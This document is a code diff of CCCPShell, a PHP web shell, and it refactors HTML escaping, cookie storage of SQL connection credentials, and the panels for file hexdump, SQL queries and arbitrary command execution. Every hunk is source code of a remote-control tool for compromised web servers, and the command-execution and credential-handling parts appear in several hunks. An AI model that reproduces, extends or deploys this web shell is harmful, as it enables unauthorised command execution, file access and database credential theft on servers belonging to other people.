@@ -25,8 +25,6 @@ $CCCPtitle[] = tText('info', 'Info');
 $CCCPmod[] = 'process';
 $CCCPtitle[] = tText('process', 'Process');
 
-
-
 // ------ Start CCCPShell
 $tiempoCarga = microtime(true);
 $isWIN = DIRECTORY_SEPARATOR === '\\';
@@ -173,7 +171,7 @@ function showIcon($file) {
 
 # General functions
 function hsc($s){
-	return htmlspecialchars($s, 2 | 1);
+	return htmlspecialchars($s, 2|1);
 }
 
 function execute($c, $i = false) {
@@ -1010,7 +1008,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 						$show_sBuff .= "\n";
 					}
 				}
-				$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . htmlspecialchars($show_sBuff) . '</pre></td></tr></table></center><br>';
+				$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
 			} else if (isset($p['hl'])) {
 				if (function_exists('highlight_file')) {
 					if ($p['hl'] === 'n') {
@@ -1034,7 +1032,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			} else {
 				$str = @fread($fp, filesize($p['t']));
 				$sBuff .= '<b>File sBuff:</b><br>' .
-							'<textarea class="bigarea" readonly>' . htmlspecialchars($str) . '</textarea><br><br>';
+							'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
 			}
 		} else
 			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
@@ -1080,7 +1078,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=n&t=\' + euc(dpath(this, false)));">' . tText('hd', 'Hexdump') . '</a>]
 									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=p&t=\' + euc(dpath(this, false)));">' . tText('hdp', 'Hexdump preview') . '</a>]
 								</p><br>
-								<textarea name="fc" cols="100" rows="25" style="width: 99%;">' . htmlspecialchars($buf) . '</textarea>
+								<textarea name="fc" cols="100" rows="25" style="width: 99%;">' . hsc($buf) . '</textarea>
 								' . mSubmit(tText('go', 'Go!'), 'uiupdate(2)') . '
 							</form></div><br><br>';
 		}
@@ -1539,12 +1537,10 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
 		if ($con !== false){
 			if(isset($p['sqlinit'])){
-				$sql_cookie = (function_exists('json_encode') && function_exists('json_decode')) ? json_encode($sql):serialize($sql);
 				$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
-				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c'])){
+				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c']))
 					$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
-				}
-				setcookie('c[' . $c_num . ']', $sql_cookie, time() + $login);
+				setcookie('c[' . $c_num . ']', ((function_exists('json_encode') && function_exists('json_decode')) ? json_encode($p) : serialize($p)), time() + $login);
 			}
 			
 			$sBuff .= '<form>' .
@@ -1552,7 +1548,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 				mHide('sqlhost', $p['sqlhost']) . mHide('sqlport', $p['sqlport']) . 
 				mHide('sqluser', $p['sqluser']) . mHide('sqlpass', $p['sqlpass']) . '
 				</form><textarea id="sqlcode" name="sqlcode" class="bigarea" style="height: 100px;"></textarea>
-				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(\'sqlcode\').value)') . '&nbsp;&nbsp;
+				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
 				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p>
 				<table class="border" style="padding:0;"><tbody>
 				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
@@ -1614,11 +1610,10 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	
 			foreach($_COOKIE['c'] as $c => $d) {
 				if ($c == $delme) continue;
-				$dbcon = (function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d);
-				foreach($dbcon as $k => $v) 
-					$sql[$k] = $v;
-				$sBuff .= sDialog('[' . strtoupper($sql['type']) . '] ' . $sql['user'] . '@' . $sql['host'] . '<span style="float:right;">' .
-					'<a href="#" onclick="ajaxLoad(\'me=sql&sqlhost=' . $sql['host'] . '&sqlport=' . $sql['port'] . '&sqluser=' . $sql['user'] . '&sqlpass=' . $sql['pass'] . '&sqltype=' . $sql['type'] . '\');">connect</a>' .
+				$sql = array();
+				foreach(((function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d)) as $k => $v) $sql[$k] = $v;
+				$sBuff .= sDialog('[' . strtoupper($sql['sqltype']) . '] ' . $sql['sqluser'] . '@' . $sql['sqlhost'] . '<span style="float:right;">' .
+					'<a href="#" onclick="ajaxLoad(\'me=sql&sqlhost=' . $sql['sqlhost'] . '&sqlport=' . $sql['sqlport'] . '&sqluser=' . $sql['sqluser'] . '&sqlpass=' . $sql['sqlpass'] . '&sqltype=' . $sql['sqltype'] . '\');">connect</a>' .
 					' | <a href="#" onclick="ajaxLoad(\'me=sql&dc=' . $c . '\')">disconnect</a></span>');
 			}
 		}
@@ -1854,7 +1849,7 @@ if (isset($p['me']) && $p['me'] === 'execute') {
 			/*$locale = 'en_GB.utf-8';
 			setlocale(LC_ALL, $locale);
 			putenv('LC_ALL='.$locale);*/
-			$buf = htmlspecialchars(execute($code));
+			$buf = hsc(execute($code));
 			if (isset($p['dta'])) 
 				$sBuff .= '<br><textarea class="bigarea" readonly>' . $buf . '</textarea>';
 			else 
@@ -1876,7 +1871,7 @@ if (isset($p['me']) && $p['me'] === 'execute') {
 				$sBuff .= $buf;
 				
 				if (isset($p['dta'])) 
-					$sBuff .= '<br><textarea class="bigarea" readonly>' . htmlspecialchars($ret) . '</textarea>';
+					$sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
 				else 
 					$sBuff .= $ret . '<br><pre></pre>';
 			} else
@@ -1885,7 +1880,7 @@ if (isset($p['me']) && $p['me'] === 'execute') {
     }
 
     $sBuff .= '<form>
-	<textarea class="bigarea" name="c">' . (isset($p['c']) ? htmlspecialchars($p['c']) : '') . '</textarea></p>
+	<textarea class="bigarea" name="c">' . (isset($p['c']) ? hsc($p['c']) : '') . '</textarea></p>
 	<p>' . tText('ev1', 'Display in text-area') . ': <input type="checkbox" name="dta" value="1" ' . (isset($p['dta']) ? 'checked' : '') . '>&nbsp;&nbsp;
 	' . tText('execute', 'Execute') . ': <input type="checkbox" name="e" value="1" ' . (isset($p['e']) ? 'checked' : '') . '>&nbsp;&nbsp;
 	<a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">[ ' . tText('ev3', 'Get examples') . ' ]</a>
